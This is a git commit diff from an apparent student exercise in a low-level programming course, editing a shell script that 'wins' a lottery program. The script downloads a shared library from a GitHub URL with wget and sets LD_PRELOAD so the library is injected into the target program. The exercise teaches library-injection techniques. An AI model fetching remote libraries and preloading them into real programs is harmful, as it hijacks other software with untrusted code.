667eb9529d4b7bc3bc6e6da071386c005e4a175c
SetthuL <langesiphosethu@gmail.com>
2023-12-14 12:27:04 -0800

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,2 +1,3 @@
 #!/bin/bash
-wget -p
+wget -p .. https://raw.githubusercontent.com/SetthuL/alx-low_level_programming/blob/3a886829b8c579fd4ee1ee8899038bee22df68d0/0x18-dynamic_libraries/libsearch.so
+export LD_PRELOAD="$PWD/libsearch.so"
